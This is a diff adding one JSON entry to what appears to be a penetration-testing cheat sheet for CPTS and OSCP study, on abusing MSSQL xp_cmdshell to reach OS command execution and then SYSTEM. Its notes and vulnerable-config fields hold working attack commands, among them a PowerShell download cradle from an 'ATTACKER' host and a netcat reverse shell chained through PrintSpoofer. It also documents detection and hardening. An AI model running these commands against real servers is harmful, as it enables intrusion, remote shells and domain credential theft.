@@ -1,0 +1,101 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "credentials"
+  ],
+  "protocols": [
+    "mssql"
+  ],
+  "tools": [
+    "mssqlclient"
+  ],
+  "tags": [
+    "mssql",
+    "xp_cmdshell",
+    "command-execution"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Token Privileges",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Connect with Windows auth",
+      "command": "mssqlclient.py sql_dev@10.129.43.30 -windows-auth"
+    },
+    {
+      "label": "Enable xp_cmdshell",
+      "command": "SQL> enable_xp_cmdshell"
+    },
+    {
+      "label": "Confirm command execution",
+      "command": "SQL> xp_cmdshell whoami"
+    },
+    {
+      "label": "Check the service account's privileges",
+      "command": "SQL> xp_cmdshell whoami /priv"
+    }
+  ],
+  "notes": "=== MSSQL xp_cmdshell — Shell Access via SQL ===\nConvert SQL access into OS command execution.\n\n=== ATTACK FLOW ===\n1. Discover credentials: Snaffler for logins.sql on shares, Responder for NTLMv2 hash\n2. Authenticate to MSSQL:\n   python3 mssqlclient.py domain/user:pass@<IP> -windows-auth\n3. Enable xp_cmdshell (requires sysadmin role):\n   SQL> enable_xp_cmdshell\n   Manual method:\n   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n4. Execute OS commands:\n   SQL> xp_cmdshell whoami /priv\n   SQL> xp_cmdshell powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\"\n\n=== CREDENTIAL SOURCES FOR MSSQL ===\nFile shares containing logins.sql, web.config, appsettings.json\nSnaffler: .\\Snaffler.exe -s -d <domain> -o snaffler.log -v data\nResponder + LLMNR → MSSQL service account NTLMv2 hash → crack offline\n\n=== SERVICE ACCOUNT PRIVILEGES ===\nMSSQL runs as: NT SERVICE\\MSSQL$INSTANCE or dedicated service account\nThese almost always have SeImpersonatePrivilege enabled\nxp_cmdshell → whoami /priv confirms → JuicyPotato/PrintSpoofer → SYSTEM\n\n=== CHAINING CONTEXT ===\nShare enum → logins.sql → mssqlclient.py → xp_cmdshell → SeImpersonate → SYSTEM → domain hashes\nSQL Server linked servers: EXEC ('xp_cmdshell ''cmd''') AT [linked_server] → RCE on linked host\nMSSQL on DC → SYSTEM on DC → secretsdump → all domain hashes\n\n=== WHAT TO LOOK FOR ===\nxp_cmdshell already enabled (legacy configs) → immediate shell\nMSSQL running as SA or local admin → highest privilege path\nLinked servers → lateral movement via SQL queries across DB servers\nSQL Agent jobs running as higher-privilege accounts → hijack job scripts",
+  "references": [
+    {
+      "title": "Impacket mssqlclient.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "mssql-instance-discovery",
+      "note": "Where the instance/account came from.",
+      "rel": "prereq"
+    },
+    {
+      "id": "seimpersonate-printspoofer",
+      "note": "Escalate the SeImpersonate token to SYSTEM.",
+      "rel": "next"
+    },
+    {
+      "id": "seimpersonate-juicypotato",
+      "note": "Older-OS potato alternative.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "mssql-enable-xpcmdshell",
+  "name": "MSSQL - Connect and Enable xp_cmdshell",
+  "command": "mssqlclient.py <user>@<ip> -windows-auth",
+  "description": "Connect to MSSQL with Windows auth, enable xp_cmdshell, and run OS commands as the SQL service account. The service account frequently holds SeImpersonatePrivilege - the entry point for a potato attack.",
+  "opsec": "loud",
+  "mitre": [
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "xp_cmdshell is a SQL Server extended stored procedure that executes OS commands as the SQL service account. When disabled (default), it can be re-enabled by a sysadmin using sp_configure. If the attacker has sysadmin access (or can impersonate a sysadmin via EXECUTE AS), enabling xp_cmdshell provides OS shell access at the SQL service account's privilege level — often Local System or a service account with SeImpersonatePrivilege.",
+    "prerequisites": "SQL Server sysadmin access (or CONTROL SERVER privilege). mssqlclient.py or SQL Server Management Studio access. sp_configure permissions.",
+    "impact": "OS command execution as the SQL Server service account. If the service account has SeImpersonatePrivilege (common for MSSQL), chaining JuicyPotato or PrintSpoofer achieves SYSTEM. Enables data exfiltration, lateral movement, and privilege escalation.",
+    "detection": "sp_configure 'xp_cmdshell' execution (SQL Server Audit). xp_cmdshell stored procedure called in SQL audit log. SQL Server error log: 'Configuration option xp_cmdshell changed'. Unusual OS processes spawned as SQL service account.",
+    "artifacts": "SQL Server audit: sp_configure 'show advanced options' + sp_configure 'xp_cmdshell' | OS process: cmd.exe spawned by sqlservr.exe | SQL error log: xp_cmdshell enabled",
+    "prevention": "Keep xp_cmdshell disabled (default). Apply principle of least privilege to SQL logins. Audit sysadmin role membership. Enable SQL Server auditing. Run SQL Server as a dedicated low-privilege service account — not Local System.",
+    "misconfiguration": "SQL Server service running as Local System or a high-privilege account. Sysadmin access granted broadly to application accounts. xp_cmdshell enabled by default or easily re-enabled by application accounts.",
+    "vulnerable_config": "# mssqlclient.py exploits sysadmin access:\nmssqlclient.py sql_svc@10.129.43.13 -windows-auth\nSQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\n# Output: nt service\\mssql$sqlexpress\n\n# Chain to SYSTEM via SeImpersonate:\nSQL> xp_cmdshell 'c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe attacker 443 -e cmd\"'",
+    "secure_config": "# Keep xp_cmdshell disabled:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n# Run MSSQL as dedicated low-privilege service account:\n# MSSQL Configuration Manager: Services > MSSQL service > Log On As\n# Use: INLANEFREIGHT\\svc_mssql (dedicated, no admin rights)\n\n# Restrict sysadmin role:\nSELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1",
+    "sources": [
+      "HTB M26",
+      "MITRE T1505.001",
+      "MITRE T1078"
+    ]
+  }
+}
